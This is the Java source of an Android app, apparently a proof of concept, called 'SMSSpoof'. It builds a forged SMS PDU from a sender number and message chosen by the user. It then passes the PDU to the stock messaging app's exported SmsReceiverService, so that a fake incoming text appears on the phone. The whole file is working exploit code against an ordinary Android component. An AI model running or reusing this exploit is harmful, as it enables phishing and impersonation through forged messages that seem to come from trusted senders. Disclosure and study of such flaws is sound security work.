package net.thomascannon.smsspoofer;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Method;
import java.util.Calendar;
import java.util.GregorianCalendar;

import android.os.Bundle;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.telephony.PhoneNumberUtils;
import android.view.Menu;
import android.view.View;
import android.widget.EditText;

public class SMSSpoof extends Activity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_smsspoof);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_smsspoof, menu);
        return true;
    }
    
    public void onSendClick(View v){
    	EditText eNum;
    	EditText eMsg;
    	String sNum;
    	String sMsg;
    	
    	eNum   = (EditText)findViewById(R.id.editNum);
    	eMsg   = (EditText)findViewById(R.id.editMsg);
    	
    	sNum = eNum.getText().toString();
    	sMsg = eMsg.getText().toString();
    	
    	//sNum cannot be blank
    	if(sNum.equals("")) sNum = "5551234";
    	
    	createFakeSms(this.getApplicationContext(),sNum,sMsg);
    	
    }
    
    private static void createFakeSms(Context context, String sender, String body) {
    //Source: http://stackoverflow.com/a/12338541
    //Source: http://blog.dev001.net/post/14085892020/android-generate-incoming-sms-from-within-your-app
        byte[] pdu = null;
        byte[] scBytes = PhoneNumberUtils
                .networkPortionToCalledPartyBCD("0000000000");
        byte[] senderBytes = PhoneNumberUtils
                .networkPortionToCalledPartyBCD(sender);
        int lsmcs = scBytes.length;
        byte[] dateBytes = new byte[7];
        Calendar calendar = new GregorianCalendar();
        dateBytes[0] = reverseByte((byte) (calendar.get(Calendar.YEAR)));
        dateBytes[1] = reverseByte((byte) (calendar.get(Calendar.MONTH) + 1));
        dateBytes[2] = reverseByte((byte) (calendar.get(Calendar.DAY_OF_MONTH)));
        dateBytes[3] = reverseByte((byte) (calendar.get(Calendar.HOUR_OF_DAY)));
        dateBytes[4] = reverseByte((byte) (calendar.get(Calendar.MINUTE)));
        dateBytes[5] = reverseByte((byte) (calendar.get(Calendar.SECOND)));
        dateBytes[6] = reverseByte((byte) ((calendar.get(Calendar.ZONE_OFFSET) + calendar
                .get(Calendar.DST_OFFSET)) / (60 * 1000 * 15)));
        try {
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            bo.write(lsmcs);
            bo.write(scBytes);
            bo.write(0x04);
            bo.write((byte) sender.length());
            bo.write(senderBytes);
            bo.write(0x00);
            bo.write(0x00); // encoding: 0 for default 7bit
            bo.write(dateBytes);
            try {
                String sReflectedClassName = "com.android.internal.telephony.GsmAlphabet";
                Class cReflectedNFCExtras = Class.forName(sReflectedClassName);
                Method stringToGsm7BitPacked = cReflectedNFCExtras.getMethod(
                        "stringToGsm7BitPacked", new Class[] { String.class });
                stringToGsm7BitPacked.setAccessible(true);
                byte[] bodybytes = (byte[]) stringToGsm7BitPacked.invoke(null,
                        body);
                bo.write(bodybytes);
            } catch (Exception e) {
            }

            pdu = bo.toByteArray();
        } catch (IOException e) {
        }

        Intent intent = new Intent();
        intent.setClassName("com.android.mms",
                "com.android.mms.transaction.SmsReceiverService");
        intent.setAction("android.provider.Telephony.SMS_RECEIVED");
        intent.putExtra("pdus", new Object[] { pdu });
        intent.putExtra("format", "3gpp");
        context.startService(intent);
    }

    private static byte reverseByte(byte b) {
        return (byte) ((b & 0xF0) >> 4 | (b & 0x0F) << 4);
    }
}
